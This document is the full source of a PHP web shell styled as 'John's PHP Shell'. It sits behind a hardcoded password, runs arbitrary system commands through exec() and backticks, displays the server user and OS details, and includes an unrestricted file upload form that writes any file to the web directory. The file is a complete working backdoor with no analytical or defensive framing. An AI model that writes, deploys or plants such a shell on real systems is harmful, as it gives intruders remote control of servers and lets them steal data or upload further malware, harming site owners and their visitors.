<?php
session_start();
?>
<?php
	$password = 'John123'; #Change this, do not touch the rest, unless you know what you're doing.
	
	if (isset($_POST['clear']) AND $_POST['clear'] == 'clear') {
		clear_command();
	}
	
	if ( ! isset($_SESSION['persist_commands']) OR ! isset($_SESSION['commands'])) {
		$_SESSION['persist_commands'] = array();
		$_SESSION['commands'] = array();
		$_SESSION['command_responses'] = array();
	}
	
	$toggling_persist = FALSE;
	$toggling_current_persist_command = FALSE;
	
	if (isset($_POST['persist_command_id']) AND is_numeric($_POST['persist_command_id'])) {
		$toggling_persist = TRUE;
		$persist_command_id = $_POST['persist_command_id'];
		if (count($_SESSION['persist_commands']) == $persist_command_id) {
			$toggling_current_persist_command = TRUE;
		} else {
			$_SESSION['persist_commands'][$persist_command_id] =
				! $_SESSION['persist_commands'][$persist_command_id];
		}
	}
	
	$previous_commands = '';
	
	foreach ($_SESSION['persist_commands'] as $index => $persist) {
		if ($persist) {
			$current_command = $_SESSION['commands'][$index];
			if ($current_command != '') {
				$previous_commands .= $current_command . '; ';
			}
		}
	}
	
	if (isset($_POST['command'])) {
		$command = $_POST['command'];
		if ( ! isset($_SESSION['logged_in'])) {
			if ($command == $password) {
				$_SESSION['logged_in'] = TRUE;
				$response = array('Welcome, ' . str_replace("\n", '', `whoami`) . '!!');
			} else {
				$response = array('Incorrect Password');
			}
			array_push($_SESSION['persist_commands'], FALSE);
			array_push($_SESSION['commands'], 'Password: ');
			array_push($_SESSION['command_responses'], $response);
		} else {
			if ($command != '' AND ! $toggling_persist) {
				if ($command == 'logout') {
					session_unset();
					$response = array('Successfully Logged Out');
				} elseif ($command == 'clear') {
					clear_command();
				} else {
					exec($previous_commands . $command . ' 2>&1', $response, $error_code);
					if ($error_code > 0 AND $response == array()) {
						$response = array('Error');
					}
				}
			} else {
				$response = array();
			}
			if ($command != 'logout' AND $command != 'clear') {
				if ($toggling_persist) {
					if ($toggling_current_persist_command) {
						array_push($_SESSION['persist_commands'], TRUE);
						array_push($_SESSION['commands'], $command);
						array_push($_SESSION['command_responses'], $response);
						if ($command != '') {
							$previous_commands = $previous_commands . $command . '; ';
						}
					}
				} else {
					array_push($_SESSION['persist_commands'], FALSE);
					array_push($_SESSION['commands'], $command);
					array_push($_SESSION['command_responses'], $response);
				}
			}
		}
	}
	
	function clear_command()
	{
		if (isset($_SESSION['logged_in'])) {
			$logged_in = TRUE;
		} else {
			$logged_in = FALSE;
		}
		session_unset();
		if ($logged_in) {
			$_SESSION['logged_in'] = TRUE;
		}
	}
	
?>
<title>~/Shell</title>
<script type="text/javascript">
  WebFontConfig = {
    google: { families: [ 'Ubuntu:300:latin' ] }
  };
  (function() {
    var wf = document.createElement('script');
    wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
      '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
    wf.type = 'text/javascript';
    wf.async = 'true';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(wf, s);
  })(); </script>
<center><font face="Ubuntu" size="3" color="#00D3D3">
<pre>
      _           _               _           ____    _   _   ____      ____    _              _   _ 
     | |   ___   | |__    _ __   ( )  ___    |  _ \  | | | | |  _ \    / ___|  | |__     ___  | | | |
  _  | |  / _ \  | '_ \  | '_ \  |/  / __|   | |_) | | |_| | | |_) |   \___ \  | '_ \   / _ \ | | | |
 | |_| | | (_) | | | | | | | | |     \__ \   |  __/  |  _  | |  __/     ___) | | | | | |  __/ | | | |
  \___/   \___/  |_| |_| |_| |_|     |___/   |_|     |_| |_| |_|       |____/  |_| |_|  \___| |_| |_|
                                                                                                     
</pre></font>
<?php
echo '<span style="color:#00D3D3;text-align:center;">OS: '.php_uname().'</span>';
?>
</center>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<style type="text/css">
		* {
			margin: 0;
			padding: 0;
		}
		body {
  -webkit-font-smoothing: antialiased;
  text-rendering: optimizeLegibility;
  font-family: "proxima-nova-soft", sans-serif;
  -webkit-user-select: none;
}
body .vertical-centered-box {
  position: absolute;
  width: 100%;
  height: 100%;
  text-align: center;
}
body .vertical-centered-box:after {
  content: '';
  display: inline-block;
  height: 100%;
  vertical-align: middle;
  margin-right: -0.25em;
}
body .vertical-centered-box .content {
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  display: inline-block;
  vertical-align: middle;
  text-align: left;
  font-size: 0;
}
.text-placeholder {
  width: 60px;
  height: 8px;
  border-radius: 4px;
  background-color: #000000;
  display: inline-block;
  vertical-align: middle;
}
* {
  -webkit-transition: all 0.3s;
  -moz-transition: all 0.3s;
  -o-transition: all 0.3s;
  transition: all 0.3s;
}
body,
.vertical-centered-box {
  background: linear-gradient(-134deg, #000000 0%, #000000 98%) #000000;
  background:url(http://i.imgur.com/nGf9oZD.jpg) fixed no-repeat right;
}
.loader-circle {
  position: absolute;
  left: 50%;
  top: 50%;
  width: 120px;
  height: 120px;
  border-radius: 50%;
  box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.1);
  margin-left: -60px;
  margin-top: -60px;
}
.loader-line-mask {
  position: absolute;
  left: 50%;
  top: 50%;
  width: 60px;
  height: 120px;
  margin-left: -60px;
  margin-top: -60px;
  overflow: hidden;
  -webkit-transform-origin: 60px 60px;
  -moz-transform-origin: 60px 60px;
  -o-transform-origin: 60px 60px;
  -ms-transform-origin: 60px 60px;
  transform-origin: 60px 60px;
  -webkit-mask-image: -webkit-linear-gradient(top, #000000, rgba(0, 0, 0, 0));
  -webkit-animation: rotate 1.2s infinite linear;
  -moz-animation: rotate 1.2s infinite linear;
  -o-animation: rotate 1.2s infinite linear;
  animation: rotate 1.2s infinite linear;
}
.loader-line-mask .loader-line {
  width: 120px;
  height: 120px;
  border-radius: 50%;
  box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.5);
}
lesshat-selector {
  -lh-property: 0; } 
@-webkit-keyframes rotate{ 0% { -webkit-transform: rotate(0deg);} 100% { -webkit-transform: rotate(360deg);}}
@-moz-keyframes rotate{ 0% { -moz-transform: rotate(0deg);} 100% { -moz-transform: rotate(360deg);}}
@-o-keyframes rotate{ 0% { -o-transform: rotate(0deg);} 100% { -o-transform: rotate(360deg);}}
@keyframes rotate{ 0% {-webkit-transform: rotate(0deg);-moz-transform: rotate(0deg);-ms-transform: rotate(0deg);transform: rotate(0deg);} 100% {-webkit-transform: rotate(360deg);-moz-transform: rotate(360deg);-ms-transform: rotate(360deg);transform: rotate(360deg);};
}
lesshat-selector {
  -lh-property: 0; } 
@-webkit-keyframes rotate{ 0% { -webkit-transform: rotate(0deg);} 100% { -webkit-transform: rotate(360deg);}}
@-moz-keyframes rotate{ 0% { -moz-transform: rotate(0deg);} 100% { -moz-transform: rotate(360deg);}}
@-o-keyframes rotate{ 0% { -o-transform: rotate(0deg);} 100% { -o-transform: rotate(360deg);}}
@keyframes rotate{ 0% {-webkit-transform: rotate(0deg);-moz-transform: rotate(0deg);-ms-transform: rotate(0deg);transform: rotate(0deg);} 100% {-webkit-transform: rotate(360deg);-moz-transform: rotate(360deg);-ms-transform: rotate(360deg);transform: rotate(360deg);};
}
::-webkit-scrollbar {
    background-color: #000000 !important;
}
 
::-webkit-scrollbar-track {
    background-color: #000000 !important;
}
 
::-webkit-scrollbar-thumb {
    background-color: #0B615E !important;
    border : solid !important;
    border-top-style: none !important;
    border-bottom-style: none !important;
    border-width : 1px !important;
    border-color: #000000 !important;
}
		body {
			background-color: #000000;
			color: #00FF00;
			font-family: monospace;
			font-weight: bold;
			font-size: 12px;
			text-align: center;
		}
		input, textarea {
			color: inherit;
			font-family: inherit;
			font-size: inherit;
			font-weight: inherit;
			background-color: inherit;
			border: inherit;
		}
		.content {
			width: 80%;
			min-width: 400px;
			margin: 40px auto;
			text-align: left;
			overflow: auto;
		}
		.terminal {
			border: 1px solid #00D3D3;
			height: 500px;
			position: relative;
			overflow: auto;
			padding-bottom: 20px;
		}
		.terminal .bar {
			border-bottom: 1px solid #00D3D3;
			padding: 2px;
			white-space: nowrap;
			overflow: hidden;
		}
		.terminal .commands {
			padding: 2px;
			padding-right: 0;
		}
		.terminal #command {
			width: 90%;
		}
		.terminal .colorize {
			color: #00FF00;
		}
		.terminal .persist_button {
			float: right;
			border-width: 1px 0 1px 1px;
			border-style: solid;
			border-color: #000000;
			clear: both;
		}
	</style>
</head>
<body>
	<div class="content">
		<div class="terminal" onclick="document.getElementById('command').focus();" id="terminal">
			<div class="bar">
				<?php echo `whoami`, ' - ', exec($previous_commands . 'pwd'); ?>
			</div>
			<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" class="commands" id="commands">
				<?php if ( ! empty($_SESSION['commands'])) { ?>
				<div>
					<?php foreach ($_SESSION['commands'] as $index => $command) { ?>
					<pre><?php echo '$ ', $command, "\n"; ?></pre>
					<?php foreach ($_SESSION['command_responses'][$index] as $value) { ?>
					<pre><?php echo htmlentities($value), "\n"; ?></pre>
					<?php } ?>
					<?php } ?>
				</div>
				<?php } ?>
				$ <?php if ( ! isset($_SESSION['logged_in'])) { ?>Password:
				<input type="password" name="command" id="command" />
				<?php } else { ?>
				<input type="text" name="command" id="command" autocomplete="off" onkeydown="return command_keyed_down(event);" />
				<?php } ?>
			</form>
		</div>
	</div>
	<script type="text/javascript">
		
		<?php
			$single_quote_cancelled_commands = array();
			if ( ! empty( $_SESSION['commands'] ) ) {
				foreach ($_SESSION['commands'] as $command) {
					$cancelled_command = str_replace('\\', '\\\\', $command);
					$cancelled_command = str_replace('\'', '\\\'', $command);
					$single_quote_cancelled_commands[] = $cancelled_command;
				}
			}
		?>
		
		var previous_commands = ['', '<?php echo implode('\', \'', $single_quote_cancelled_commands) ?>', ''];
		
		var current_command_index = previous_commands.length - 1;
		
		document.getElementById('command').select();
		
		document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
		
		function toggle_persist_command(command_id)
		{
			document.getElementById('persist_command_id').value = command_id;
			document.getElementById('commands').submit();
		}
		
		function command_keyed_down(event)
		{
			var key_code = get_key_code(event);
			if (key_code == 38) { //Up arrow
				fill_in_previous_command();
			} else if (key_code == 40) { //Down arrow
				fill_in_next_command();
			} else if (key_code == 9) { //Tab
				
			} else if (key_code == 13) { //Enter
				if (event.shiftKey) {
					toggle_persist_command(<?php
						if (isset($_SESSION['commands'])) {
							echo count($_SESSION['commands']);
						} else {
							echo 0;
						}
					?>);
					return false;
				}
			}
			return true;
		}
		
		function fill_in_previous_command()
		{
			current_command_index--;
			if (current_command_index < 0) {
				current_command_index = 0;
				return;
			}
			document.getElementById('command').value = previous_commands[current_command_index];
		}
		
		function fill_in_next_command()
		{
			current_command_index++;
			if (current_command_index >= previous_commands.length) {
				current_command_index = previous_commands.length - 1;
				return;
			}
			document.getElementById('command').value = previous_commands[current_command_index];
		}
		
		function get_key_code(event)
		{
			var event_key_code = event.keyCode;
			return event_key_code;
		}
		
	</script>
	<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
		<input type="Submit" name="clear" value="Clear All" />
		<input type="hidden" value="Clear" onfocus="this.style.color='#0000FF';" onblur="this.style.color='';" />
	</form>
</body>
<?php
echo '<font color="#00D3D3" size="2">';
if(isset($_POST['Submit'])){
	$filedir = ""; 
	$maxfile = '2000000';
	$mode = '0644';
	$userfile_name = $_FILES['image']['name'];
	$userfile_tmp = $_FILES['image']['tmp_name'];
	if(isset($_FILES['image']['name'])) {
		$qx = $filedir.$userfile_name;
		@move_uploaded_file($userfile_tmp, $qx);
		@chmod ($qx, octdec($mode));
echo'<span style="color:#00D3D3;text-align:center;">Done! ==> '.$userfile_name.'</span>'; 
}
}
else{
echo'<form method="POST" action="#" color="#00D3D3" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Upload"></form>';
}
echo '</font>';
?>
